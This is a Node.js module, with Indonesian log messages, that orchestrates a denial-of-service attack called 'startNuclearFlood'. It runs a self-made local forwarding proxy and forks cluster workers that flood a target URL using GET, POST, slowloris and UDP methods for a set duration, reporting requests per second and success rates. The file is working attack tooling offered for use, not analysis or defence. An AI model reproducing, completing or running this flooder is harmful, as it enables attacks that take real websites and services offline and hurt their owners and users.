const cluster = require('cluster');
const os = require('os');
const url = require('url');
const http = require('http');
const net = require('net');
const httpProxy = require('http-proxy');
const path = require('path');

const LOCAL_PROXY_PORT = 9999;

function startSelfMadeProxy() {
    const proxy = httpProxy.createProxyServer({});

    const server = http.createServer((req, res) => {
        proxy.web(req, res, { target: req.url, changeOrigin: true }, (err) => {
            if (!res.headersSent) {
                res.writeHead(502);
            }
            res.end("Proxy error");
        });
    });

    server.on('connect', (req, clientSocket, head) => {
        const { port, hostname } = url.parse(`//${req.url}`, false, true);
        if (hostname && port) {
            const serverSocket = net.connect(port, hostname, () => {
                clientSocket.write(
                    'HTTP/1.1 200 Connection Established\r\n' +
                    'Proxy-agent: Node-Proxy\r\n' +
                    '\r\n'
                );
                serverSocket.write(head);
                serverSocket.pipe(clientSocket).on('error', () => {});
                clientSocket.pipe(serverSocket).on('error', () => {});
            });

            serverSocket.on('error', (err) => {
                clientSocket.end(`HTTP/1.1 500 ${err.message}\r\n\r\n`);
            });
        } else {
            clientSocket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
        }
    });

    server.listen(LOCAL_PROXY_PORT, () => {
        console.log(`Proxy buatan sendiri berjalan di http://127.0.0.1:${LOCAL_PROXY_PORT}`);
    }).on('error', (err) => console.error("Gagal memulai server proxy:", err.message));

    return `http://127.0.0.1:${LOCAL_PROXY_PORT}`;
}

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
    if (cluster.isPrimary) {
        const selfMadeProxyUrl = startSelfMadeProxy();

        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: path.join(__dirname, 'worker.js'),
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let lastTotalSent = 0;
        let currentRps = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            currentRps = Math.round((totalSent - lastTotalSent) / 5);
            lastTotalSent = totalSent;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining,
                rps: currentRps
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        const numCPUs = 2;
        const attackMethods = ['get', 'post', 'slowloris', 'udp'];
        
        for (let i = 0; i < numCPUs; i++) {
            const workerAttackType = attackMethods[i % attackMethods.length];
            const worker = cluster.fork({ 
                ATTACK_TYPE: workerAttackType,
                PROXY_URL: selfMadeProxyUrl
            });
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

module.exports = { startNuclearFlood };